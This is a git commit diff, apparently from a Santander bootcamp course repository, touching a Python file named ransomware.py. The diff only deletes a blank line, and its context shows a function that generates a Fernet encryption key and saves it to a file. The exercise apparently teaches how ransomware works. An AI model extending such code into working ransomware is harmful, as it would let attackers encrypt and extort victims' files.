18497b5d0c575f226220088bf25ff97cb0642e4a
Alexandre Gammaro <alexgammaro@yahoo.com.br>
2025-10-22 00:56:28 -0300

    Initial commit

--- DIO/BootCampSantander2025/ransomware.py
+++ DIO/BootCampSantander2025/ransomware.py
@@ -2,7 +2,6 @@ from cryptography.fernet import Fernet
 import os
 
 #1. Gerar uma chave de criptografia e salvar
-
 def gerar_chave():
     chave = Fernet.generate_key()
     with open("chave.key", "wb") as chave_file:
